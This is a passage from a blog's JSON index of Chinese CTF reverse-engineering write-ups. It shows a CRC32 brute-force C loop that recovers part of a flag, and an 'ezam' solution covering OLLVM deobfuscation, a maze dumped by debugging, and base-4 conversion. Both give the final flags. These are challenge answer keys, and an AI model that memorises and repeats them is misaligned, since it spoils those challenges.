0xEC635C01, 0x0B6B51F4, 0x026C6162, 0x196530D8, 0x1062004E, 0xF40695ED, 0xFD01A57B, 0xE608F4C1, 0xEF0FC457, 0xF5B0D9C6, 0xFCB7E950, 0xE7BEB8EA, 0xEEB9887C, 0x0ADD1DDF, 0x03DA2D49, 0x18D37CF3, 0x11D44C65, 0x0DB26158, 0x04B551CE, 0x1FBC0074, 0x16BB30E2, 0xF2DFA541, 0xFBD895D7, 0xE0D1C46D, 0xE9D6F4FB, 0xF369E96A, 0xFA6ED9FC, 0xE1678846, 0xE860B8D0, 0x0C042D73, 0x05031DE5, 0x1E0A4C5F, 0x170D7CC9, 0xF005713C, 0xF90241AA, 0xE20B1010, 0xEB0C2086, 0x0F68B525, 0x066F85B3, 0x1D66D409, 0x1461E49F, 0x0EDEF90E, 0x07D9C998, 0x1CD09822, 0x15D7A8B4, 0xF1B33D17, 0xF8B40D81, 0xE3BD5C3B, 0xEABA6CAD, 0xEDB88320, 0xE4BFB3B6, 0xFFB6E20C, 0xF6B1D29A, 0x12D54739, 0x1BD277AF, 0x00DB2615, 0x09DC1683, 0x13630B12, 0x1A643B84, 0x016D6A3E, 0x086A5AA8, 0xEC0ECF0B, 0xE509FF9D, 0xFE00AE27, 0xF7079EB1, 0x100F9344, 0x1908A3D2, 0x0201F268, 0x0B06C2FE, 0xEF62575D, 0xE66567CB, 0xFD6C3671, 0xF46B06E7, 0xEED41B76, 0xE7D32BE0, 0xFCDA7A5A, 0xF5DD4ACC, 0x11B9DF6F, 0x18BEEFF9, 0x03B7BE43, 0x0AB08ED5, 0x16D6A3E8, 0x1FD1937E, 0x04D8C2C4, 0x0DDFF252, 0xE9BB67F1, 0xE0BC5767, 0xFBB506DD, 0xF2B2364B, 0xE80D2BDA, 0xE10A1B4C, 0xFA034AF6, 0xF3047A60, 0x1760EFC3, 0x1E67DF55, 0x056E8EEF, 0x0C69BE79, 0xEB61B38C, 0xE266831A, 0xF96FD2A0, 0xF068E236, 0x140C7795, 0x1D0B4703, 0x060216B9, 0x0F05262F, 0x15BA3BBE, 0x1CBD0B28, 0x07B45A92, 0x0EB36A04, 0xEAD7FFA7, 0xE3D0CF31, 0xF8D99E8B, 0xF1DEAE1D, 0x1B64C2B0, 0x1263F226, 0x096AA39C, 0x006D930A, 0xE40906A9, 0xED0E363F, 0xF6076785, 0xFF005713, 0xE5BF4A82, 0xECB87A14, 0xF7B12BAE, 0xFEB61B38, 0x1AD28E9B, 0x13D5BE0D, 0x08DCEFB7, 0x01DBDF21, 0xE6D3D2D4, 0xEFD4E242, 0xF4DDB3F8, 0xFDDA836E, 0x19BE16CD, 0x10B9265B, 0x0BB077E1, 0x02B74777, 0x18085AE6, 0x110F6A70, 0x0A063BCA, 0x03010B5C, 0xE7659EFF, 0xEE62AE69, 0xF56BFFD3, 0xFC6CCF45, 0xE00AE278, 0xE90DD2EE, 0xF2048354, 0xFB03B3C2, 0x1F672661, 0x166016F7, 0x0D69474D, 0x046E77DB, 0x1ED16A4A, 0x17D65ADC, 0x0CDF0B66, 0x05D83BF0, 0xE1BCAE53, 0xE8BB9EC5, 0xF3B2CF7F, 0xFAB5FFE9, 0x1DBDF21C, 0x14BAC28A, 0x0FB39330, 0x06B4A3A6, 0xE2D03605, 0xEBD70693, 0xF0DE5729, 0xF9D967BF, 0xE3667A2E, 0xEA614AB8, 0xF1681B02, 0xF86F2B94, 0x1C0BBE37, 0x150C8EA1, 0x0E05DF1B, 0x0702EF8D&#125;; char cstr[] = &quot;...KCTF381654729&quot;; int main() &#123; for (int i = 0x20; i &lt; 0x7e; i++) &#123; for (int j = 0x20; j &lt; 0x7e; j++) &#123; for (int k = 0x20; k &lt; 0x7e; k++) &#123; cstr[0] = i; cstr[1] = j; cstr[2] = k; int32_t v11 = -1; for (int idx = 0; idx &lt; 16; idx++) &#123; v11 = magic_arr[(uint8_t)(v11 ^ cstr[idx])] ^ (v11 &gt;&gt; 8); &#125; if ((~v11) == 0xF52E0765) &#123; printf(&quot;%c %c %c\\n&quot;, i, j, k); &#125; &#125; &#125; &#125;&#125; 最后的flag:421KCTF381654729","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"-加解密","slug":"加解密","permalink":"http://example.com/tags/%E5%8A%A0%E8%A7%A3%E5%AF%86/"}],"keywords":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}]},{"title":"ezam","slug":"ezam（ollvm 迷宫 进制）","date":"2022-05-23T16:00:00.000Z","updated":"2022-05-28T09:03:02.930Z","comments":true,"path":"2022/05/24/ezam（ollvm 迷宫 进制）/","link":"","permalink":"http://example.com/2022/05/24/ezam%EF%BC%88ollvm%20%E8%BF%B7%E5%AE%AB%20%E8%BF%9B%E5%88%B6%EF%BC%89/","excerpt":"","text":"题目打开 标准的ollvm混肴，用脚本两次去除 得到正常的程序 初步分析是以为多项式相加，疏忽了v17以及前面一大段数据的初始化。想着用z3硬解失败了。主要逻辑为读取输入，判断是否为数字，然后转换成四进制，走迷宫。前面的一大段加密是初始化迷宫地图v17，我们可以动调得到一个16*28的迷宫：（做题多尝试 123456789101112131415161,0,0,0,0,0,1,1,1,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,0,0,0,1,1,0,1,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,1,0,0,0,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,1,0,0,0,0,0,1,0,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,1,1,1,1,1,1,1,1,0,0,0,1,0,0,0,0,0,1,1,0,1,1,0,0,1,0,0,0,1,0,0,1,0,0,1,1,0,0,0,0,0,0,1,0,1,0,0,0,1,0,0,1,1,0,0,1,0,0,1,0,0,0,1,0,0,0,1,1,1,0,0,0,1,0,1,1,0,0,0,1,0,0,1,0,0,0,1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,0,0,0,1,0,0,1,0,1,0,0,0,1,1,0,1,0,0,0,0,1,0,0,0,0,0,0,1,0,1,1,0,1,0,0,0,1,0,0,1,0,0,0,1,1,0,0,0,0,1,0,1,1,1,0,0,1,1,1,1,1,1,1,1,0,0,1,1,0,0,0,0,0,1,1,1,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,0,0,0,1,1,0,0,0,1,1,0,0,0,0,0,0,1,0,0,0,1,0,1,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0 下面看一下 sub_400670 函数 ，结合动调，是十进制转四进制算法。下面就是迷宫出走方式得到两条路径，根据函数判断路径长度是45，所以是上面那条232222322330030000303322223333333222233333333232222322330030000303322222222222333333300033333333然后四进制转十进制得到flag 1234567891011def anyToDecimal(num,n): baseStr = &#123;&quot;0&quot;:0,&quot;1&quot;:1,&quot;2&quot;:2,&quot;3&quot;:3,&quot;4&quot;:4,&quot;5&quot;:5,&quot;6&quot;:6,&quot;7&quot;:7,&quot;8&quot;:8,&quot;9&quot;:9, &quot;a&quot;:10,&quot;b&quot;:11,&quot;c&quot;:12,&quot;d&quot;:13,&quot;e&quot;:14,&quot;f&quot;:15,&quot;g&quot;:16,&quot;h&quot;:17,&quot;i&quot;:18,&quot;j&quot;:19&#125; new_num = 0 nNum = len(num) - 1 for i in num: new_num = new_num + baseStr[i]*pow(n,nNum) nNum = nNum -1 print(new_num)anyToDecimal(&#x27;232222322330030000303322223333333222233333333&#x27;, 4) flag{902741462666576198076399615}","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"迷宫","slug":"迷宫","permalink":"http://example.com/tags/%E8%BF%B7%E5%AE%AB/"},{"name":"进制","slug":"进制","permalink":"http://example.com/tags/%E8%BF%9B%E5%88%B6/"}],"keywords":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}]}]}